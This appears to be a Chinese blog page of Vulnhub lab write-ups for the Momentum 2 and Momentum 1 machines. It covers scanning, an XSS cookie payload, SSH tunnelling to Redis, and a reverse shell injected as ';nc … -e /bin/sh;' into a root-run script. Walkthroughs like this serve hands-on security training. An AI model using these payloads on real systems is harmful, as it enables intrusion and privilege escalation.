-<p>1.查看同目录下的password-reminder.txt文件，得到一个密码提示，Asterisk是<em>的意思，可以猜测是任意字符，但其实ssh登录尝试一下就是</em>：</p>
-<p><img src="/2022/08/15/Momentum-2/20.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/21.png" alt="image-"></p>
-<p>2.查看当前用户权限，可以以root身份执行cookie-gen.py，查看文件，发现会将输入的值传给seed参数，然后写入到log.txt中，在echo时会执行bash命令：</p>
-<p><img src="/2022/08/15/Momentum-2/22.png" alt="image-"></p>
-<p>3.可以直接输入反弹shell给seed，然后kali开启对应端口监听，在&#x2F;root目录下能得到第二个flag，即root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反弹shell：;nc 192.168.56.102 12345 -e /bin/sh;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/08/15/Momentum-2/23.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-2/24.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/Momentum-1/">
-                Momentum 1
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="momentum1">Momentum:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称momentum1">名称：Momentum:1</span></h4><h4><span id="发布日期2021422">发布日期：2021.4.22</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名momentumova">文件名：Momentum.ova</span></h4><h4><span id="文件大小662mb">文件大小：662MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentumova">下载地址：</span></h4><h4><span id="md5-556bea96fe2cb1506814d1e79f5c5e19">MD5: 556BEA96FE2CB1506814D1E79F5C5E19</span></h4><h4><span id="sha1-40c918a7eff2eb3cf1708428a583702a4bffd96c">SHA1: 40C918A7EFF2EB3CF1708428A583702A4BFFD96C</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Momentum和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/15/Momentum-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.106 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/4.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现四个可见目录，可以去看看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.106 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="xss漏洞利用">XSS漏洞利用</span></h3><blockquote>
-<p>1.访问192.168.56.106&#x2F;js，发现有一个main.js，js里有个重定向链接opus-details.php?id&#x3D;，后面拼接了个参数str，而这个php是主页图片点击后再点击一次的详情介绍：</p>
-<p><img src="/2022/08/15/Momentum-1/7.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/8.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/9.png" alt="image-"></p>
-<p>2.拼接的str字串会被直接打印出来，因为是js下进行构建的，首先想到xss，构造xss的payload爆出cookie：</p>
-<p><img src="/2022/08/15/Momentum-1/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/11.png" alt="image-"></p>
-<p>3.这cookie明显是进行了加密，回到main.js有提示，使用的是aes，进行解密得到很像用户名-密码的形式的字串auxerre-alienum##：</p>
-<p><img src="/2022/08/15/Momentum-1/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录准备提权">SSH登录，准备提权</span></h3><blockquote>
-<p>1.因为靶机有开放22端口，利用ssh登录，发现用户auxerre的密码就是auxerre-alienum##：</p>
-<p><img src="/2022/08/15/Momentum-1/13.png" alt="image-"></p>
-<p>2.接下来我们要使用LinEnum.sh这个工具对靶机进行进一步信息收集，在kali搭建一个http服务，准备上传工具到靶机<br>（工具地址：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%EF%BC%89%EF%BC%9A">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/14.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/LinEnum.sh，靶机下载工具（文件在桌面）</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/15.png" alt="image-"></p>
-<p>3.添加权限，靶机运行LinEnum.sh后，查看输出信息，发现6379端口占用，此端口是数据库redis的默认端口，确认后可以尝试kali登录redis：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh &gt; 1.txt</span><br><span class="line">cat 1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/16.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/17.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/18.png" alt="image-"></p>
-<p>4.现在我们可以尝试利用ssh远程连接6379端口，然后在kali端登录，这里kali同样使用6379端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 6379:127.0.0.1:6379 auxerre@192.168.56.106</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/20.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.我们可以在数据库内看到一个rootpass键，而键内包含着很像是密码的字串，使用root用户登录，成功提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br><span class="line">get rootpass</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/21.png" alt="image-"></p>
-<p>2.进行root登录，在&#x2F;root目录下能找到flag，即root.txt：</p>
-<p><img src="/2022/08/15/Momentum-1/22.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
